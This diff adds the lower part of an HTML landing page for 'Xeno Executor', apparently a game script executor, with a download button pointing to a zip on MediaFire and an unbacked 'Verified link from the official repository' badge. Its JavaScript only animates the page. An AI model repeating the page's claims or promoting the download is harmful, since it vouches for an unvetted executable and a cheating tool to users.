+                        <i class="fas fa-chevron-down text-purple-400 transition-transform group-open:rotate-180"></i>
+                    </summary>
+                    <p class="text-gray-400 text-sm mt-4 leading-relaxed">
+                        The source code is available in the <a href="https://github.com/WeightCreatorApplaud/Xeno-Executor" target="_blank" class="text-purple-400 hover:text-purple-300 underline underline-offset-2">GitHub repository</a>. Support and script sharing are in the official Xeno Discord server.
+                    </p>
+                </details>
+            </div>
+        </div>
+    </section>
+
+    <!-- ===== CTA ===== -->
+    <section class="relative py-24 px-6">
+        <div class="max-w-4xl mx-auto text-center">
+            <div class="glass p-12 md:p-16 rounded-3xl fade-in relative overflow-hidden">
+                <!-- Decorative Glow -->
+                <div class="absolute -top-20 -right-20 w-60 h-60 bg-purple-600/20 rounded-full blur-3xl"></div>
+                <div class="absolute -bottom-20 -left-20 w-60 h-60 bg-cyan-600/20 rounded-full blur-3xl"></div>
+
+                <div class="relative z-10">
+                    <h2 class="text-3xl md:text-5xl font-bold text-white mb-4">
+                        Ready to start <span class="gradient-text">scripting</span>?
+                    </h2>
+                    <p class="text-gray-400 max-w-xl mx-auto mb-8">
+                        Download Xeno Executor right now — free, keyless, and without limits.
+                    </p>
+                    <a href="https://www.mediafire.com/file/4wkcs25mguiycil/Xeno_Executor.zip/file" target="_blank"
+                       class="btn-primary text-lg !py-5 !px-12">
+                        <i class="fas fa-download text-xl"></i>
+                        Download Xeno Executor
+                    </a>
+                    <p class="text-gray-500 text-xs mt-6">
+                        <i class="fas fa-shield-alt mr-1"></i> Verified link from the official repository
+                    </p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ===== FOOTER ===== -->
+    <footer class="relative border-t border-white/5 py-12 px-6">
+        <div class="max-w-6xl mx-auto">
+            <div class="flex flex-col md:flex-row items-center justify-between gap-6">
+                <div class="flex items-center gap-3">
+                    <div class="w-8 h-8 rounded-lg bg-gradient-to-br from-purple-600 to-cyan-500 flex items-center justify-center text-white font-bold text-sm">
+                        X
+                    </div>
+                    <span class="text-lg font-bold font-['Space_Grotesk'] text-white">
+                        Xeno<span class="text-purple-400">.</span>
+                    </span>
+                </div>
+
+                <div class="flex items-center gap-6">
+                    <a href="https://github.com/WeightCreatorApplaud/Xeno-Executor" target="_blank"
+                       class="text-gray-500 hover:text-white transition-colors text-xl" title="GitHub">
+                        <i class="fab fa-github"></i>
+                    </a>
+                    <a href="https://www.mediafire.com/file/4wkcs25mguiycil/Xeno_Executor.zip/file" target="_blank"
+                       class="text-gray-500 hover:text-white transition-colors text-xl" title="Download">
+                        <i class="fas fa-download"></i>
+                    </a>
+                </div>
+
+                <p class="text-gray-600 text-xs text-center md:text-right">
+                    © 2026 Xeno Executor Project.<br>
+                    For educational and research purposes only.
+                </p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- ===== JAVASCRIPT ===== -->
+    <script>
+        // Smooth fade-in on scroll
+        document.addEventListener('DOMContentLoaded', function () {
+            const observerOptions = {
+                threshold: 0.1,
+                rootMargin: '0px 0px -50px 0px'
+            };
+
+            const observer = new IntersectionObserver(function (entries) {
+                entries.forEach(function (entry) {
+                    if (entry.isIntersecting) {
+                        entry.target.classList.add('visible');
+                        observer.unobserve(entry.target);
+                    }
+                });
+            }, observerOptions);
+
+            document.querySelectorAll('.fade-in').forEach(function (el) {
+                observer.observe(el);
+            });
+
+            // Immediately show elements already in viewport
+            document.querySelectorAll('.fade-in').forEach(function (el) {
+                const rect = el.getBoundingClientRect();
+                if (rect.top < window.innerHeight && rect.bottom > 0) {
+                    el.classList.add('visible');
+                }
+            });
+        });
+
+        // Smooth scroll for anchor links
+        document.querySelectorAll('a[href^="#"]').forEach(function (anchor) {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) {
+                    target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                }
+            });
+        });
+    </script>
+
+</body>
+</html>
